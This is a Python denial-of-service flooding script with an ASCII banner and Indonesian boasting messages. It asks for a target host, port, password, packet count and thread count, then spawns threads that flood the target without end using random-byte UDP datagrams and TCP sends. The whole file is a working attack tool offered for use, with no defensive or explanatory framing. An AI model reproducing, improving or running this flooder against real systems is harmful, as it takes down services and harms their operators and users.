	#!/usr/bin/env python3
#Code by pushy
#Remake by : pushy
import random
import socket
import threading
import os,sys
import time

os.system("clear")
print ("Remake By : pushy ")
print("""\033[91m               
██╗░░██╗░░░░░░░█████╗░░█████╗░██╗░░░░░██╗
╚██╗██╔╝░░░░░░██╔══██╗██╔══██╗██║░░░░░██║
░╚███╔╝░█████╗██║░░╚═╝██║░░██║██║░░░░░██║
░██╔██╗░╚════╝██║░░██╗██║░░██║██║░░░░░██║
██╔╝╚██╗░░░░░░╚█████╔╝╚█████╔╝███████╗██║
╚═╝░░╚═╝░░░░░░░╚════╝░░╚════╝░╚══════╝╚═╝
""")
print("\033[0m")

ip = str(input("\033[0m }====> \033[91m Target Host/Ip:"))
port = int(input("  \033[0m }====> \033[91m Target Port:"))
choice = str(input("  \033[0m }====> \033[91m Masukan Password:"))
times = int(input("  \033[0m }====> \033[91m Packets:"))
threads = int(input("\033[0m }====> \033[91m Threads:"))

os.system("clear")
def run():
	data = random._urandom(1027)
	i = random.choice(("\033[93m[@] (pushy) ===> ","\033[93m[@] (pushy) ===> ","\033[93m[@] (pushy) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
		except:
			print("[MAMPUS] DOWN YAH BWANG!!!")

def run2():
	data = random._urandom(24)
	i = random.choice(("\033[93m[@] (pushy) ===> ","\033[93m[@] (pushy) ===> ","\033[93m[@] (NDAGOG) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
		except:
			s.close()
			print("[MAMPUS] DOWN YAH BWANG!!!")

def run3():
	data = random._urandom(16)
	i = random.choice(("\033[93m[@] (pushy) ===> ","\033[93m[@] (pushy) ===> ","\033[93m[@] (NDAGOG) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
		except:
			s.close()
			print("[MAMPUS] DOWN YAH BWANG!!!")

for y in range(threads):
	if choice == 'x-coli':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
